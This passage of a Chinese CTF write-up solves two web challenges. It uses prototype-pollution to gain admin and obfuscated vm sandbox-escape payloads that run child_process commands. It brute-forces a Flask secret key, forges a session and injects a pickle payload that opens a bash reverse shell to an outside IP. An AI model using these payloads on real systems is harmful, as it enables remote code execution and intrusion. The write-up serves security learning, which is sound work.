class="hljs-attr">secret</span>: crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">64</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),    <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,    <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">true</span>&#125;))<span class="hljs-keyword">var</span> users = &#123;&#125;<span class="hljs-keyword">var</span> admins = &#123;&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;        <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&#x27;__proto__&#x27;</span>) &#123;            <span class="hljs-keyword">continue</span>        &#125;        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;            <span class="hljs-title function_">merge</span>(target[key], source[key])        &#125; <span class="hljs-keyword">else</span> &#123;            target[key] = source[key]        &#125;    &#125;    <span class="hljs-keyword">return</span> target&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">clone</span>(<span class="hljs-params">source</span>) &#123;    <span class="hljs-keyword">return</span> <span class="hljs-title function_">merge</span>(&#123;&#125;, source)&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">code</span>) &#123;    <span class="hljs-keyword">let</span> blacklist = [<span class="hljs-string">&#x27;constructor&#x27;</span>, <span class="hljs-string">&#x27;mainModule&#x27;</span>, <span class="hljs-string">&#x27;require&#x27;</span>, <span class="hljs-string">&#x27;child_process&#x27;</span>, <span class="hljs-string">&#x27;process&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;execSync&#x27;</span>, <span class="hljs-string">&#x27;execFile&#x27;</span>, <span class="hljs-string">&#x27;execFileSync&#x27;</span>, <span class="hljs-string">&#x27;spawn&#x27;</span>, <span class="hljs-string">&#x27;spawnSync&#x27;</span>, <span class="hljs-string">&#x27;fork&#x27;</span>]    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v <span class="hljs-keyword">of</span> blacklist) &#123;        <span class="hljs-keyword">if</span> (code.<span class="hljs-title function_">includes</span>(v)) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(v + <span class="hljs-string">&#x27; is banned&#x27;</span>)        &#125;    &#125;&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">requireLogin</span>(<span class="hljs-params">req, res, next</span>) &#123;    <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>) &#123;        res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>)    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-title function_">next</span>()    &#125;&#125;app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) &#123;        <span class="hljs-keyword">delete</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[key]    &#125;    <span class="hljs-title function_">next</span>()&#125;)app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;    res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/index.html&#x27;</span>)&#125;)app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;    res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/login.html&#x27;</span>)&#125;)app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/register&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;    res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/register.html&#x27;</span>)&#125;)app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;    <span class="hljs-keyword">let</span> &#123; username, password &#125; = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>)    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users &amp;&amp; password === users[username]) &#123;        req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span> = username        <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> admins) &#123;            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;admin&#x27;</span>        &#125; <span class="hljs-keyword">else</span> &#123;            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;guest&#x27;</span>        &#125;        res.<span class="hljs-title function_">send</span>(&#123;            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;login success&#x27;</span>        &#125;)    &#125; <span class="hljs-keyword">else</span> &#123;        res.<span class="hljs-title function_">send</span>(&#123;            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;login failed&#x27;</span>        &#125;)    &#125;&#125;)app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/register&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;    <span class="hljs-keyword">let</span> &#123; username, password &#125; = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>)    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users) &#123;        res.<span class="hljs-title function_">send</span>(&#123;            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;register failed&#x27;</span>        &#125;)    &#125; <span class="hljs-keyword">else</span> &#123;        users[username] = password        res.<span class="hljs-title function_">send</span>(&#123;            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;register success&#x27;</span>        &#125;)    &#125;&#125;)app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/profile&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;    res.<span class="hljs-title function_">send</span>(&#123;        <span class="hljs-string">&#x27;user&#x27;</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>,        <span class="hljs-string">&#x27;role&#x27;</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span>    &#125;)&#125;)app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/sandbox&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;        <span class="hljs-keyword">let</span> code = req.<span class="hljs-property">body</span>.<span class="hljs-property">code</span>        <span class="hljs-keyword">let</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>)        <span class="hljs-keyword">let</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox)                <span class="hljs-keyword">try</span> &#123;            <span class="hljs-title function_">waf</span>(code)            <span class="hljs-keyword">let</span> result = vm.<span class="hljs-title function_">runInContext</span>(code, context)            res.<span class="hljs-title function_">send</span>(&#123;                <span class="hljs-string">&#x27;result&#x27;</span>: result            &#125;)        &#125; <span class="hljs-keyword">catch</span> (e) &#123;            res.<span class="hljs-title function_">send</span>(&#123;                <span class="hljs-string">&#x27;result&#x27;</span>: e.<span class="hljs-property">message</span>            &#125;)        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        res.<span class="hljs-title function_">send</span>(&#123;            <span class="hljs-string">&#x27;result&#x27;</span>: <span class="hljs-string">&#x27;Your role is not admin, so you can not run any code&#x27;</span>        &#125;)    &#125;&#125;)app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/logout&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;    req.<span class="hljs-property">session</span>.<span class="hljs-title function_">destroy</span>()    res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>)&#125;)app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;server start listening on :3000&#x27;</span>)&#125;)</code></pre></div><p>首先是原型链污染</p><p>代码在注册和登录的时候使用了 <code>clone(req.body)</code></p><div class="code-wrapper"><pre><code class="hljs n1ql">function <span class="hljs-keyword">merge</span>(target, source) &#123;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> source) &#123;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">key</span> === <span class="hljs-string">&#x27;__proto__&#x27;</span>) &#123;            <span class="hljs-keyword">continue</span>        &#125;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> source &amp;&amp; <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> target) &#123;            <span class="hljs-keyword">merge</span>(target[<span class="hljs-keyword">key</span>], source[<span class="hljs-keyword">key</span>])        &#125; <span class="hljs-keyword">else</span> &#123;            target[<span class="hljs-keyword">key</span>] = source[<span class="hljs-keyword">key</span>]        &#125;    &#125;    <span class="hljs-keyword">return</span> target&#125;<span class="hljs-keyword">function</span> clone(source) &#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">merge</span>(&#123;&#125;, source)&#125;</code></pre></div><p>过滤了<code>__proto__</code>可以用<code>constructor.prototype</code>绕过</p><p>先注册一个 test 用户, 在登录时 POST 如下内容, 污染 admins 对象, 使得 <code>username in admins</code> 表达式的结果为 True</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>        <span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>            <span class="hljs-attr">&quot;test&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;123&quot;</span>        <span class="hljs-punctuation">&#125;</span>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p>污染的是<code>&#123;&#125;</code>的<code>constructor.prototype</code>，即Object中会有一个test属性</p><p>所以当</p><div class="code-wrapper"><pre><code class="hljs">if (username in users &amp;&amp; password === users[username]) &#123;    req.session.user = username    if (username in admins) &#123;        req.session.role = &#39;admin&#39;    &#125; else &#123;        req.session.role = &#39;guest&#39;    &#125;</code></pre></div><p>判断时，<code>admins</code>数组会优先从<code>Object</code>中获取到test，于是test账号成为了admin</p><p>然后就是vm沙箱逃逸</p><p><a href="https://xz.aliyun.com/t/11859">https://xz.aliyun.com/t/11859</a>写的很好</p><div class="code-wrapper"><pre><code class="hljs">    let code = req.body.code    let sandbox = Object.create(null)    let context = vm.createContext(sandbox)        try &#123;        waf(code)        let result = vm.runInContext(code, context)        res.send(&#123;            &#39;result&#39;: result        &#125;)</code></pre></div><p>直接使用文章中的代码，但是有waf，手动拼接进行绕过</p><p>wp中给出了两种方法</p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">// method 1</span><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, &#123; <span class="hljs-comment">// Proxy 对象用于创建对某一对象的代理, 以实现属性和方法的拦截</span>    <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123; <span class="hljs-comment">// 访问这个对象的任意一个属性都会执行 get 指向的函数</span>        <span class="hljs-keyword">const</span> c = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>        <span class="hljs-keyword">const</span> p = (c[<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>][<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>](<span class="hljs-string">&#x27;return pro&#x27;</span>+<span class="hljs-string">&#x27;cess&#x27;</span>))()        <span class="hljs-keyword">return</span> p[<span class="hljs-string">&#x27;mainM&#x27;</span>+<span class="hljs-string">&#x27;odule&#x27;</span>][<span class="hljs-string">&#x27;requi&#x27;</span>+<span class="hljs-string">&#x27;re&#x27;</span>](<span class="hljs-string">&#x27;child_pr&#x27;</span>+<span class="hljs-string">&#x27;ocess&#x27;</span>)[<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ecSync&#x27;</span>](<span class="hljs-string">&#x27;cat /flag&#x27;</span>).<span class="hljs-title function_">toString</span>();    &#125;&#125;)<span class="hljs-comment">// method 2</span><span class="hljs-keyword">let</span> obj = &#123;&#125; <span class="hljs-comment">// 针对该对象的 message 属性定义一个 getter, 当访问 obj.message 时会调用对应的函数</span>obj.<span class="hljs-title function_">__defineGetter__</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;    <span class="hljs-keyword">const</span> c = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>    <span class="hljs-keyword">const</span> p = (c[<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>][<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>](<span class="hljs-string">&#x27;return pro&#x27;</span>+<span class="hljs-string">&#x27;cess&#x27;</span>))()    <span class="hljs-keyword">return</span> p[<span class="hljs-string">&#x27;mainM&#x27;</span>+<span class="hljs-string">&#x27;odule&#x27;</span>][<span class="hljs-string">&#x27;requi&#x27;</span>+<span class="hljs-string">&#x27;re&#x27;</span>](<span class="hljs-string">&#x27;child_pr&#x27;</span>+<span class="hljs-string">&#x27;ocess&#x27;</span>)[<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ecSync&#x27;</span>](<span class="hljs-string">&#x27;cat /flag&#x27;</span>).<span class="hljs-title function_">toString</span>();&#125;)<span class="hljs-keyword">throw</span> obj</code></pre></div><h1 id="第三周"><a href="#第三周" class="headerlink" title="第三周"></a>第三周</h1><h2 id="notebook"><a href="#notebook" class="headerlink" title="notebook"></a>notebook</h2><p>开启题目，找了半天，原来是会给出<code>app.py</code>的</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> flask import Flask, request, render_template, sessionimport pickleimport uuidimport osapp = Flask(__name__)app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(2).hex()class Note(object):    def __init__(self, name, content):        self._name = name        self._content = content    @property    def name(self):        return self._name        @property    def content(self):        return self._content@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)def index():    return render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)@app.route(<span class="hljs-string">&#x27;/&lt;path:note_id&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>])def view_note(note_id):    notes = session.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;notes&#x27;</span>)    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> notes:        return render_template(<span class="hljs-string">&#x27;note.html&#x27;</span>, <span class="hljs-attribute">msg</span>=<span class="hljs-string">&#x27;You have no notes&#x27;</span>)        note_raw = notes.<span class="hljs-built_in">get</span>(note_id)    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> note_raw:        return render_template(<span class="hljs-string">&#x27;note.html&#x27;</span>, <span class="hljs-attribute">msg</span>=<span class="hljs-string">&#x27;This note does not exist&#x27;</span>)       <span class="hljs-built_in"> note </span>= pickle.loads(note_raw)    return render_template(<span class="hljs-string">&#x27;note.html&#x27;</span>, <span class="hljs-attribute">note_id</span>=note_id, <span class="hljs-attribute">note_name</span>=note.name, <span class="hljs-attribute">note_content</span>=note.content)@app.route(<span class="hljs-string">&#x27;/add_note&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>])def add_note():    note_name = request.form.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;note_name&#x27;</span>)    note_content = request.form.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;note_content&#x27;</span>)    <span class="hljs-keyword">if</span> note_name == <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> note_content == <span class="hljs-string">&#x27;&#x27;</span>:        return render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, <span class="hljs-attribute">status</span>=<span class="hljs-string">&#x27;add_failed&#x27;</span>, <span class="hljs-attribute">msg</span>=<span class="hljs-string">&#x27;note name or content is empty&#x27;</span>)        note_id = str(uuid.uuid4())   <span class="hljs-built_in"> note </span>= Note(note_name, note_content)    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;notes&#x27;</span>):        session[<span class="hljs-string">&#x27;notes&#x27;</span>] = &#123;&#125;        notes = session[<span class="hljs-string">&#x27;notes&#x27;</span>]    notes[note_id] = pickle.dumps(note)    session[<span class="hljs-string">&#x27;notes&#x27;</span>] = notes    return render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, <span class="hljs-attribute">status</span>=<span class="hljs-string">&#x27;add_success&#x27;</span>, <span class="hljs-attribute">note_id</span>=note_id)@app.route(<span class="hljs-string">&#x27;/delete_note&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>])def delete_note():    note_id = request.form.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;note_id&#x27;</span>)    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> note_id:        return render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)        notes = session.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;notes&#x27;</span>)    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> notes:        return render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, <span class="hljs-attribute">status</span>=<span class="hljs-string">&#x27;delete_failed&#x27;</span>, <span class="hljs-attribute">msg</span>=<span class="hljs-string">&#x27;You have no notes&#x27;</span>)        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> notes.<span class="hljs-built_in">get</span>(note_id):        return render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, <span class="hljs-attribute">status</span>=<span class="hljs-string">&#x27;delete_failed&#x27;</span>, <span class="hljs-attribute">msg</span>=<span class="hljs-string">&#x27;This note does not exist&#x27;</span>)        del notes[note_id]    session[<span class="hljs-string">&#x27;notes&#x27;</span>] = notes    return render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, <span class="hljs-attribute">status</span>=<span class="hljs-string">&#x27;delete_success&#x27;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    app.<span class="hljs-built_in">run</span>(<span class="hljs-attribute">host</span>=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-attribute">port</span>=8000, <span class="hljs-attribute">debug</span>=<span class="hljs-literal">False</span>)</code></pre></div><p>一眼看到<code>pickle.loads()</code>和<code>pickle.dumps</code>并且毫无过滤</p><p>并且结果都是在session中的，可以想到flask-session伪造</p><p>有关session部分的操作没看懂的话可以把生成的session使用工具进行解码就会清楚很多</p><p><code>app.config[&#39;SECRET_KEY&#39;] = os.urandom(2).hex()</code></p><p>手动生成一下<code>os.urandom(2).hex()</code>，会发现是4位数，可以进行爆破</p><p>wp中的python写字典</p><div class="code-wrapper"><pre><code class="hljs livecodeserver">import itertoolsd = itertools.product(<span class="hljs-string">&#x27;0123456789abcdef&#x27;</span>, <span class="hljs-keyword">repeat</span>=<span class="hljs-number">4</span>)<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;dicts.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:        s = <span class="hljs-string">&#x27;&#x27;</span>.join(i)        f.<span class="hljs-built_in">write</span>(s + <span class="hljs-string">&#x27;\n&#x27;</span>)</code></pre></div><p>要爆破session的话要用<a href="https://github.com/Paradoxis/Flask-Unsign">https://github.com/Paradoxis/Flask-Unsign</a></p><p>就不能用<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><div class="code-wrapper"><pre><code class="hljs bash">flask-unsign -u -c <span class="hljs-string">&quot;eyJub3RlcyI6e319.ZRaiVg.28tEyvEpXfcjFl5rrQ7K_nkl208&quot;</span> -w dicts.txt --no-literal-eval</code></pre></div><p>这里wp中<code>-c</code>后面用的是<strong>单引号</strong>，但我要用<strong>双引号</strong>才能成功（可能与wp作者用的是mac有关）</p><div class="code-wrapper"><pre><code class="hljs llvm">D:\CTF-tool\python脚本\Flask-Unsign-master\tests&gt;flask-unsign -u -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;.eJw1yk0LgjAcgPGvErsPdG2yCR2WZFmMIt_S4_q7TGYFJVbid68OPZff5RnQ5fqo7sgfEBUeY1POsScAMKVMY87BwVNwoCLMHF0tft9EIx-dZJzt5L9ABaEwOg9v2gpjo36RtMIpyzixQTu3K5Juoj48EFbrPE8bqZ6q2X6tTUFEB8usg3Ws5Fu9VLl3izOdoXEcP8_pL4U.ZVy64Q.UC73ttAT_J3qfi-sfE7O2ryZjQ8&quot;</span> -w C:\Users\<span class="hljs-number">86136</span>\Desktop\challenge\test\upload\dict.txt --no-literal-eval[*] Session decodes <span class="hljs-keyword">to</span>: &#123;&#x27;notes&#x27;: &#123;&#x27;<span class="hljs-number">49655388</span><span class="hljs-number">-69</span>dd<span class="hljs-number">-445</span>b<span class="hljs-number">-88</span>d<span class="hljs-number">0</span><span class="hljs-number">-3</span>d<span class="hljs-number">0</span>de<span class="hljs-number">25</span>fc<span class="hljs-number">1</span>b<span class="hljs-number">9</span>&#x27;: b&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">80</span>\<span class="hljs-keyword">x</span><span class="hljs-number">04</span>\<span class="hljs-keyword">x</span><span class="hljs-number">95</span>&lt;\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">08</span>__main__\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">04</span>Note\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">93</span>\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>)\<span class="hljs-keyword">x</span><span class="hljs-number">81</span>\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>&#125;\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>(\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">05</span>_name\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">03123</span>\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">08</span>_content\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">03321</span>\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>ub.&#x27;&#125;&#125;[*] Starting brute-forcer with <span class="hljs-number">8</span> threads..[+] Found secret key after <span class="hljs-number">30464</span> attemptsb&#x27;<span class="hljs-number">76</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>&#x27;</code></pre></div><p>看到解码的内容，很明显，key对应的是路由，value对应的是pickle序列化后的值</p><p>加上我们看到毫无过滤，直接手写opcode</p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/118.89.61.71/7777 0&gt;&amp;1&quot;&#x27;</span><span class="hljs-string">ios</span><span class="hljs-string">system</span><span class="hljs-string">.&#x27;&#x27;&#x27;</span></code></pre></div><p>给出wp中说到的一些细节</p><blockquote><p>首先, 如果你使用 <code>pickle.dumps()</code> 来生成 payload, 那么你得知道不同操作系统生成的 pickle 序列化数据是有区别的</p><p>参考: <a href="https://xz.aliyun.com/t/7436">https://xz.aliyun.com/t/7436</a></p><div class="code-wrapper"><pre><code class="hljs taggerscript"># Linux (注意 posix) b&#x27;cposix<span class="hljs-symbol">\n</span>system<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>(Vwhoami<span class="hljs-symbol">\n</span>p1<span class="hljs-symbol">\n</span>tp2<span class="hljs-symbol">\n</span>Rp3<span class="hljs-symbol">\n</span>.&#x27; # Windows (注意 nt) b&#x27;cnt<span class="hljs-symbol">\n</span>system<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>(Vwhoami<span class="hljs-symbol">\n</span>p1<span class="hljs-symbol">\n</span>tp2<span class="hljs-symbol">\n</span>Rp3<span class="hljs-symbol">\n</span>.&#x27;</code></pre></div><p>在 Windows 上生成的 pickle payload 无法在 Linux 上运行</p><p>当然如果手动去构造 opcode, 那是没有这个问题的, 比如这段 opcode</p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-string">b&#x27;&#x27;&#x27;cos\nsystem\n(S&#x27;whoami&#x27;\ntR.&#x27;&#x27;&#x27;</span></code></pre></div><p>其次, 很多人过来问为什么构造了恶意 pickle 序列化数据发送之后服务器报错 500, 其实这个是正常现象, 没啥问题</p><p>上面代码在 <code>pickle.loads()</code> 之后得到 note 对象, 然后访问它的 id, name, content 属性, 即 <code>note.id</code>, <code>note.name</code>, <code>note.content</code></p><p>如果是正常的 pickle 数据, 那么服务器就会显示正常的 note 内容</p><p>如果是恶意的 pickle 数据, 那么 <code>pickle.loads()</code> 返回的就是通过 <code>__reduce__</code> 方法调用的某个函数所返回的结果, 根本就没有 id, name, content 这些属性, 当然就会报错了</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:<span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>): <span class="hljs-keyword">return</span> (<span class="hljs-built_in">str</span>, (<span class="hljs-string">&quot;123&quot;</span>, ))s = pickle.dumps(A(), protocol=<span class="hljs-number">0</span>)obj = pickle.loads(s)<span class="hljs-built_in">print</span>(obj) <span class="hljs-comment"># 123</span></code></pre></div><p>换成 <code>os.system()</code> 同理, 在 Linux 中通过这个函数执行的命令, 如果执行成功, 则返回 0, 否则返回非 0 值</p><p>虽然服务器会报错 500, 但命令其实还是执行成功的</p><p>然后, 也有一部分人问为什么没有回显? 为什么反弹 shell 失败?</p><p>首先为什么没有回显我上面已经说了, 而且就算 <code>os.system()</code> 有回显你也看不到, 因为回显的内容根本就不会在网页上输出</p><p>至于为什么反弹 shell 失败, 提示 <code>sh: 1: Syntax error: Bad fd number.</code>, 很多人用的都是这个命令</p><div class="code-wrapper"><pre><code class="hljs awk">bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/host.docker.internal/</span><span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span></code></pre></div><p>这个命令存在一些注意点, 首先得理解 bash 反弹 shell 的本质</p><p><a href="https://www.k0rz3n.com/2018/08/05/Linux">https://www.k0rz3n.com/2018/08/05/Linux</a>反弹shell（一）文件描述符与重定向&#x2F;</p><p>[<a 